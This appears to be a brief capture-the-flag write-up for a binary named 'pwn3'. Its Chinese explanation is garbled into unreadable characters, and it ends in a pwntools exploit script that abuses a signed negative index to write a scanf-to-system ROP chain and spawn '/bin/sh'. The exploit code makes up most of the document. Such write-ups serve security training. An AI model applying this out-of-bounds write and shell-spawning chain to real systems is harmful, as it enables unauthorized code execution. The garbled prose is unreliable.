������������index�ȽϹ����е�©��ȥ���е�����  
0x80000000�Լ���ֵ�ϸ�����������signed�Ļ����Ǹ���  
���ǳ���֮������������������ԾͿ���д������߽�֮�������  
֮������scanf->system����ͦ�򵥵�= =  
  
```python
from pwn import *
system_addr=0x8048420
scanf_addr=0x8048470
format_addr=0x804884B
data_addr=0x804a030
shellstr='/bin/sh'
p=process('./pwn3')
def put4bytes(addr,offset4):
	p.recv()
	p.sendline('-'+str(0x80000000-0xe-offset4))
	p.recv()
	p.sendline(str(addr))
p.recv()
p.sendline('whatever')
put4bytes(scanf_addr,0)
put4bytes(system_addr,1)
put4bytes(format_addr,2)
put4bytes(data_addr,3)
for i in xrange(5):
	put4bytes(0,4)
p.sendline(shellstr)
p.interactive()
```